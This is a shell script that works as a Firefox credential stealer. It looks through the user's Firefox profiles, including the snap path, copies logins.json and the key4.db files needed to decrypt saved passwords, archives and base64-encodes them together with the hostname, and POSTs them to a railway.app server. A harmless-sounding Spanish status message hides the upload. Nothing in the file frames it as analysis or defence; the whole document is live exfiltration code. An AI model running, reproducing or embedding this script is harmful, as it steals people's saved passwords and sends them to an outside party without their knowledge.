#!/bin/sh
set -u

API="https://web-production-35ede.up.railway.app/utils/"
HOST="$(hostname 2>/dev/null || uname -n)"
W="$(mktemp -d)"; T="$W/ff.tgz"; B="$W/body.json"; R="$W/resp.json"
trap 'rm -rf "$W"' EXIT
mkdir -p "$W/p"

i=0
for base in "$HOME/.mozilla/firefox" "$HOME/snap/firefox/common/.mozilla/firefox"; do
  [ -d "$base" ] || continue
  for prof in "$base"/*/; do
    [ -f "$prof/logins.json" ] || continue
    i=$((i+1)); d="$W/p/$i"; mkdir -p "$d"
    cp -f "$prof/logins.json"  "$d/" 2>/dev/null
    cp -f "$prof/key4.db"      "$d/" 2>/dev/null
    cp -f "$prof/key4.db-wal"  "$d/" 2>/dev/null
    cp -f "$prof/key4.db-shm"  "$d/" 2>/dev/null
    cp -f "$prof/profile.ini"  "$d/" 2>/dev/null
  done
done
[ "$i" -gt 0 ] || exit 0

tar czf "$T" -C "$W/p" . 2>/dev/null || exit 0

printf '{"attachments":[{"filename":"ff_%s.tgz","content":"%s"}]}' \
  "$HOST" "$(base64 -w0 "$T")" > "$B"

CODE="$(curl -sS -o "$R" -w '%{http_code}' -X POST \
  -H 'Content-Type: application/json' --data-binary @"$B" "$API")"

if [ "$CODE" -ge 200 ] && [ "$CODE" -lt 300 ]; then
  echo "Solicitud realizada correctamente"
  cat "$R"; echo
else
  echo "ERROR (HTTP $CODE)"
  cat "$R"; echo
fi